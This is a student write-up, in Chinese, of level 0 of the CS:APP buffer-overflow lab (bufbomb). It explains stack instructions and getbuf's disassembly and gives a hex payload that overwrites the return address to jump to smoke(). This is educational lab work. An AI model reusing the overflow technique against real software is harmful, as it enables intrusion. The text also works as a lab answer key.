- LAB4-buflab

# 基本操作&小知识

* 设置用户名
```bash
$ ./markdown Lancer
> 0x17dab4ef
```

* 十六进制转ASCII码
```bash
$ ./hex2raw < exploit.txt > exploit-raw.txt
```

* 答案放在文件中运行bufbomb
```bash
$ ./bufbomb -u Lancer < exploit-raw.txt
```

* push、pop、call、leave、ret
    * push: 栈指针先向下移，后复制到栈
    等价于
    ```assembly
    subl    $4, %esp
    movl    %ebp (%esp)
    ```
    * pop: 先取出数据，后栈指针向上移
    等价于
    ```assembly
    movl    (%esp), %ead
    addl    $4, %esp
    ```
    * call: 将返回地址（下一条指令的ip）压入栈，后跳转
    等价于
    ```assembly
    push    %eip
    jmp     08049262 <func>
    ```
    * leave: 将栈指针指向帧指针，后pop备份的原指针到%ebp
    等价于
    ```assembly
    mov     %ebp, %esp
    pop     %ebp
    ```
    * ret: 把原先压入栈的ip内容进行出栈，并送入ip中
    等价于
    ```assembly
    pop     ip      # 实际上不存在这样的指令，只是方便记忆
    ```

# 解题

## level0
```c
void test()
{
    int val;
    /* Put canary on stack to detect possible corruption */
    volatile int local = uniqueval();

    val = getbuf();     // 关键在这一行，怎么让getbuf()缓冲区溢出跳转到smoke()函数

    /* Check for corrupted stack */
    if (local != uniqueval()) {
        printf("Sabotaged!: the stack has been corrupted\n");
    }
    else if (val == cookie) {
        printf("Boom!: getbuf returned 0x%x\n", val);
        validate(3);
    } else {
        printf("Dud: getbuf returned 0x%x\n", val);
    }
    }
```

```assembly
08049262 <getbuf>:
getbuf():
 8049262:	55                   	push   %ebp
 8049263:	89 e5                	mov    %esp,%ebp
 8049265:	83 ec 38             	sub    $0x38,%esp
 8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax		# 缓冲区大小为0x28（40）
 804926b:	89 04 24             	mov    %eax,(%esp)
 804926e:	e8 bf f9 ff ff       	call   8048c32 <Gets>
 8049273:	b8 01 00 00 00       	mov    $0x1,%eax            # <- 执行到这里的栈
```
![stack_0x8049273](./image/stack_0x8049273.jpg)
```assembly
 8049278:	c9                   	leave  
 8049279:	c3                   	ret                         # <- 执行到这里时
```
![stack_0x8049279](./image/stack_0x8049279.jpg)

所以，要想跳转到`08048e0a <smoke>`，要先垫40 + 4 = 44字节，接下来的4个字节存要跳转的地址。  
因为采用的小端法，所以跳转地址还得反着写。  
还有一点值得注意，0a对应的ASCII码是`\n`换行，所以不能填。这里我们填`0a`的下一个数`0b`。  
答案如下，当然得用`./hex2raw`转换后才能用啦。
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 0b 8e 04 08     /* 0a是换行，不能填 */
```